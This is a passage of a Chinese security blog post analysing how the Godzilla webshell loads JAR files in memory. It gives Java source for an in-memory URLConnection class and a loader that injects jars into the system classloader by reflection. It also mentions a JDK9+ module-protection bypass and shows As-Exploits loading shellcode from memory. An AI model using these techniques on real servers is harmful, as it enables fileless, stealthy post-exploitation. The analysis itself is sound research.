+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import java.io.ByteArrayInputStream;
+</span></span><span class="line"><span class="cl">import java.io.IOException;
+</span></span><span class="line"><span class="cl">import java.io.InputStream;
+</span></span><span class="line"><span class="cl">import java.lang.reflect.Field;
+</span></span><span class="line"><span class="cl">import java.net.MalformedURLException;
+</span></span><span class="line"><span class="cl">import java.net.URL;
+</span></span><span class="line"><span class="cl">import java.net.URLConnection;
+</span></span><span class="line"><span class="cl">import java.util.ArrayList;
+</span></span><span class="line"><span class="cl">import java.util.List;
+</span></span><span class="line"><span class="cl">import java.util.Map;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">public class MemoryBufferURLConnection extends URLConnection {
+</span></span><span class="line"><span class="cl">    private static List files;
+</span></span><span class="line"><span class="cl">    private final String contentType;
+</span></span><span class="line"><span class="cl">    private final byte[] data;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    protected MemoryBufferURLConnection(URL url) {
+</span></span><span class="line"><span class="cl">        super(url);
+</span></span><span class="line"><span class="cl">        String file = url.getFile();
+</span></span><span class="line"><span class="cl">        int indexOf = file.indexOf(47);
+</span></span><span class="line"><span class="cl">        synchronized (files) {
+</span></span><span class="line"><span class="cl">            this.data = (byte[]) files.get(Integer.parseInt(file.substring(0, indexOf)));
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        this.contentType = file.substring(indexOf + 1);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public static URL createURL(byte[] bArr, String str) throws MalformedURLException {
+</span></span><span class="line"><span class="cl">        synchronized (files) {
+</span></span><span class="line"><span class="cl">            files.add(bArr);
+</span></span><span class="line"><span class="cl">            URL url = new URL(&#34;jarmembuff&#34;, &#34;&#34;, files.size() - 1 + &#34;/&#34; + str);
+</span></span><span class="line"><span class="cl">            return url;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public void connect() throws IOException {
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public int getContentLength() {
+</span></span><span class="line"><span class="cl">        return this.data.length;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public String getContentType() {
+</span></span><span class="line"><span class="cl">        return this.contentType;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public InputStream getInputStream() throws IOException {
+</span></span><span class="line"><span class="cl">        return new ByteArrayInputStream(this.data); // 直接返回内存中的内容
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="添加到systemclassloader的ucp中" class="headerLink">
+    <a href="#%e6%b7%bb%e5%8a%a0%e5%88%b0systemclassloader%e7%9a%84ucp%e4%b8%ad" class="header-mark"></a>5.4 添加到SystemClassLoader的ucp中</h3><p>调用时首先将两个类打入内存上下文，然后调用MemoryBufferURLConnection的createURL创建构造好的URL对象，最后通过反射塞到SystemClassLoader的ucp中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">public String load(byte[] jarClassData) {
+</span></span><span class="line"><span class="cl">    Class URLConnectionClass = null;
+</span></span><span class="line"><span class="cl">    try {
+</span></span><span class="line"><span class="cl">        String MemoryBufferURLConnection = &#34;&#34;;
+</span></span><span class="line"><span class="cl">        String MemoryBufferURLStreamHandler = &#34;&#34;;
+</span></span><span class="line"><span class="cl">        defClz(Base64DecodeToByte(MemoryBufferURLStreamHandler));
+</span></span><span class="line"><span class="cl">        URLConnectionClass = defClz(Base64DecodeToByte(MemoryBufferURLConnection));
+</span></span><span class="line"><span class="cl">    } catch (Exception e) {
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    if (jarClassData != null) {
+</span></span><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            return addJar((URL) URLConnectionClass.getMethod(&#34;createURL&#34;, byte[].class, String.class).invoke(null, jarClassData, &#34;application/jar&#34;));
+</span></span><span class="line"><span class="cl">        } catch (Exception e) {
+</span></span><span class="line"><span class="cl">            return e.getMessage();
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    } else {
+</span></span><span class="line"><span class="cl">        return &#34;jarByteArray is null&#34;;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="files对象" class="headerLink">
+    <a href="#files%e5%af%b9%e8%b1%a1" class="header-mark"></a>5.5 files对象</h3><p>这里哥斯拉有一个小细节，MemoryBufferURLStreamHandler中有一个没有使用过的files对象，研究了一下是什么作用
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695894141876-21cce173-43d9-4959-abce-6bd3bed325f5.png#averageHue=%23fbfaf9&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=426&amp;id=ylMuN&amp;originHeight=852&amp;originWidth=1222&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=505330&amp;status=done&amp;style=none&amp;taskId=u0d81d1c7-5d47-4a9c-9757-bd8b111b1a5&amp;title=&amp;width=611" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695894141876-21cce173-43d9-4959-abce-6bd3bed325f5.png#averageHue=%23fbfaf9&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=426&amp;id=ylMuN&amp;originHeight=852&amp;originWidth=1222&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=505330&amp;status=done&amp;style=none&amp;taskId=u0d81d1c7-5d47-4a9c-9757-bd8b111b1a5&amp;title=&amp;width=611">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695894141876-21cce173-43d9-4959-abce-6bd3bed325f5.png#averageHue=%23fbfaf9&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=426&amp;id=ylMuN&amp;originHeight=852&amp;originWidth=1222&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=505330&amp;status=done&amp;style=none&amp;taskId=u0d81d1c7-5d47-4a9c-9757-bd8b111b1a5&amp;title=&amp;width=611"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695894141876-21cce173-43d9-4959-abce-6bd3bed325f5.png#averageHue=%23fbfaf9&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=426&amp;id=ylMuN&amp;originHeight=852&amp;originWidth=1222&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=505330&amp;status=done&amp;style=none&amp;taskId=u0d81d1c7-5d47-4a9c-9757-bd8b111b1a5&amp;title=&amp;width=611, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695894141876-21cce173-43d9-4959-abce-6bd3bed325f5.png#averageHue=%23fbfaf9&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=426&amp;id=ylMuN&amp;originHeight=852&amp;originWidth=1222&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=505330&amp;status=done&amp;style=none&amp;taskId=u0d81d1c7-5d47-4a9c-9757-bd8b111b1a5&amp;title=&amp;width=611 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695894141876-21cce173-43d9-4959-abce-6bd3bed325f5.png#averageHue=%23fbfaf9&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=426&amp;id=ylMuN&amp;originHeight=852&amp;originWidth=1222&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=505330&amp;status=done&amp;style=none&amp;taskId=u0d81d1c7-5d47-4a9c-9757-bd8b111b1a5&amp;title=&amp;width=611 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure>
+其实是因为MemoryBufferURLConnection每次是new出来的，无法保存之前加载过的Jar内容，这里的List是一个浅拷贝，链接到MemoryBufferURLStreamHandler实例对象中，这样就可以在每次new之后依旧保留曾经加载过的jar，不需要重复加载。</p>
+<h2 id="适配高版本jdk" class="headerLink">
+    <a href="#%e9%80%82%e9%85%8d%e9%ab%98%e7%89%88%e6%9c%acjdk" class="header-mark"></a>6 适配高版本JDK</h2><p>JDK9实现了模块化，SystemClassLoader不再是URLClassLoader的子类，所以原有的Poc就不能直接用了。520师傅后来进行了一系列改进，支持了高版本JDK。其实基本原理差不多，主要是用<a href="https://github.com/BeichenDream/Kcon2021Code" target="_blank" rel="noopener noreferrer">https://github.com/BeichenDream/Kcon2021Code</a>中的trick绕过JDK了模块保护和反射过滤</p>
+<h2 id="as-exploits内存加载shellcode" class="headerLink">
+    <a href="#as-exploits%e5%86%85%e5%ad%98%e5%8a%a0%e8%bd%bdshellcode" class="header-mark"></a>7 As-Exploits内存加载ShellCode</h2><p>通过Jar加载器-内存加载，上传ext目录下的loader.jar
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668416161-4df3612f-2a06-4978-96a6-ed8ac4668247.png#averageHue=%23f7f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=654&amp;id=ua29c213d&amp;originHeight=817&amp;originWidth=1375&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=37802&amp;status=done&amp;style=none&amp;taskId=u90a475c8-88a9-4ee9-8df6-3c6002469a0&amp;title=&amp;width=1100" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668416161-4df3612f-2a06-4978-96a6-ed8ac4668247.png#averageHue=%23f7f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=654&amp;id=ua29c213d&amp;originHeight=817&amp;originWidth=1375&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=37802&amp;status=done&amp;style=none&amp;taskId=u90a475c8-88a9-4ee9-8df6-3c6002469a0&amp;title=&amp;width=1100">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668416161-4df3612f-2a06-4978-96a6-ed8ac4668247.png#averageHue=%23f7f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=654&amp;id=ua29c213d&amp;originHeight=817&amp;originWidth=1375&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=37802&amp;status=done&amp;style=none&amp;taskId=u90a475c8-88a9-4ee9-8df6-3c6002469a0&amp;title=&amp;width=1100"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668416161-4df3612f-2a06-4978-96a6-ed8ac4668247.png#averageHue=%23f7f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=654&amp;id=ua29c213d&amp;originHeight=817&amp;originWidth=1375&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=37802&amp;status=done&amp;style=none&amp;taskId=u90a475c8-88a9-4ee9-8df6-3c6002469a0&amp;title=&amp;width=1100, https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668416161-4df3612f-2a06-4978-96a6-ed8ac4668247.png#averageHue=%23f7f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=654&amp;id=ua29c213d&amp;originHeight=817&amp;originWidth=1375&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=37802&amp;status=done&amp;style=none&amp;taskId=u90a475c8-88a9-4ee9-8df6-3c6002469a0&amp;title=&amp;width=1100 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668416161-4df3612f-2a06-4978-96a6-ed8ac4668247.png#averageHue=%23f7f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=654&amp;id=ua29c213d&amp;originHeight=817&amp;originWidth=1375&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=37802&amp;status=done&amp;style=none&amp;taskId=u90a475c8-88a9-4ee9-8df6-3c6002469a0&amp;title=&amp;width=1100 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure>
+可以通过Js引擎执行功能先试一下看类在不在，发现确实可以查找到
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668481406-8ba1cf83-b93e-4233-9e23-c77cbef02367.png#averageHue=%23f7f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=647&amp;id=uc7a585b1&amp;originHeight=809&amp;originWidth=1373&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=37057&amp;status=done&amp;style=none&amp;taskId=uacd8a506-9e65-4e2f-afb2-999a6583281&amp;title=&amp;width=1098.4" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668481406-8ba1cf83-b93e-4233-9e23-c77cbef02367.png#averageHue=%23f7f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=647&amp;id=uc7a585b1&amp;originHeight=809&amp;originWidth=1373&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=37057&amp;status=done&amp;style=none&amp;taskId=uacd8a506-9e65-4e2f-afb2-999a6583281&amp;title=&amp;width=1098.4">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668481406-8ba1cf83-b93e-4233-9e23-c77cbef02367.png#averageHue=%23f7f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=647&amp;id=uc7a585b1&amp;originHeight=809&amp;originWidth=1373&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=37057&amp;status=done&amp;style=none&amp;taskId=uacd8a506-9e65-4e2f-afb2-999a6583281&amp;title=&amp;width=1098.4"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668481406-8ba1cf83-b93e-4233-9e23-c77cbef02367.png#averageHue=%23f7f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=647&amp;id=uc7a585b1&amp;originHeight=809&amp;originWidth=1373&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=37057&amp;status=done&amp;style=none&amp;taskId=uacd8a506-9e65-4e2f-afb2-999a6583281&amp;title=&amp;width=1098.4, https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668481406-8ba1cf83-b93e-4233-9e23-c77cbef02367.png#averageHue=%23f7f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=647&amp;id=uc7a585b1&amp;originHeight=809&amp;originWidth=1373&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=37057&amp;status=done&amp;style=none&amp;taskId=uacd8a506-9e65-4e2f-afb2-999a6583281&amp;title=&amp;width=1098.4 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668481406-8ba1cf83-b93e-4233-9e23-c77cbef02367.png#averageHue=%23f7f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=647&amp;id=uc7a585b1&amp;originHeight=809&amp;originWidth=1373&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=37057&amp;status=done&amp;style=none&amp;taskId=uacd8a506-9e65-4e2f-afb2-999a6583281&amp;title=&amp;width=1098.4 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure>
+ShellCode加载器模块-加载方式JNA，exploit，弹出计算器，也就实现了内存加载ShellCode的功能
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668561833-0eda2d8f-5319-4b96-9e76-b991071702cf.png#averageHue=%23f5f5f4&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=638&amp;id=ua0c9ac8a&amp;originHeight=797&amp;originWidth=1363&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=90448&amp;status=done&amp;style=none&amp;taskId=u962b0acd-af0b-4f28-8bf2-53c1de993eb&amp;title=&amp;width=1090.4" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668561833-0eda2d8f-5319-4b96-9e76-b991071702cf.png#averageHue=%23f5f5f4&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=638&amp;id=ua0c9ac8a&amp;originHeight=797&amp;originWidth=1363&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=90448&amp;status=done&amp;style=none&amp;taskId=u962b0acd-af0b-4f28-8bf2-53c1de993eb&amp;title=&amp;width=1090.4">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668561833-0eda2d8f-5319-4b96-9e76-b991071702cf.png#averageHue=%23f5f5f4&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=638&amp;id=ua0c9ac8a&amp;originHeight=797&amp;originWidth=1363&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=90448&amp;status=done&amp;style=none&amp;taskId=u962b0acd-af0b-4f28-8bf2-53c1de993eb&amp;title=&amp;width=1090.4"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668561833-0eda2d8f-5319-4b96-9e76-b991071702cf.png#averageHue=%23f5f5f4&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=638&amp;id=ua0c9ac8a&amp;originHeight=797&amp;originWidth=1363&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=90448&amp;status=done&amp;style=none&amp;taskId=u962b0acd-af0b-4f28-8bf2-53c1de993eb&amp;title=&amp;width=1090.4, https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668561833-0eda2d8f-5319-4b96-9e76-b991071702cf.png#averageHue=%23f5f5f4&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=638&amp;id=ua0c9ac8a&amp;originHeight=797&amp;originWidth=1363&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=90448&amp;status=done&amp;style=none&amp;taskId=u962b0acd-af0b-4f28-8bf2-53c1de993eb&amp;title=&amp;width=1090.4 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668561833-0eda2d8f-5319-4b96-9e76-b991071702cf.png#averageHue=%23f5f5f4&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=638&amp;id=ua0c9ac8a&amp;originHeight=797&amp;originWidth=1363&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=90448&amp;status=done&amp;style=none&amp;taskId=u962b0acd-af0b-4f28-8bf2-53c1de993eb&amp;title=&amp;width=1090.4 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+</div>
+
+        
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-10-09</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/memory-jarloader/" data-title="分析哥斯拉内存加载Jar技术"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/memory-jarloader/"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/memory-jarloader/" data-title="分析哥斯拉内存加载Jar技术"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/memory-jarloader/" data-title="分析哥斯拉内存加载Jar技术"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/memory-jarloader/" data-title="分析哥斯拉内存加载Jar技术"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/memory-jarloader/" data-title="分析哥斯拉内存加载Jar技术" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;分析哥斯拉内存加载Jar技术&#34;, &#34;https://yzddmr6.com/posts/memory-jarloader/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/swinglazyvalue-in-webshell/" class="prev" rel="prev" title="SwingLazyValue在WebShell下的利用"><i class="fas fa-angle-left fa-fw"></i>SwingLazyValue在WebShell下的利用</a>
+            <a href="/posts/gzh/" class="next" rel="next" title="[置顶] 搞了个公众号">[置顶] 搞了个公众号<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
